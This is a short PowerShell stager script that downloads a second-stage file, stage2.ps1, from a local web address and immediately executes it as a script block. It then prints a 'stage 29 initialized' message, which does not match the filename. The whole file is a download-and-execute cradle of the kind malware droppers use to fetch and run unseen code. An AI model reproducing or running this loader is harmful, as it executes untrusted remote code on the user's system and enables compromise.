$DownloadUrl = 'https://localhost:8081/stage2.ps1'
$DownloadedScript = (New-Object Net.WebClient).DownloadString($DownloadUrl)
& ([ScriptBlock]::Create($DownloadedScript))
Write-Output "stage 29 initialized"
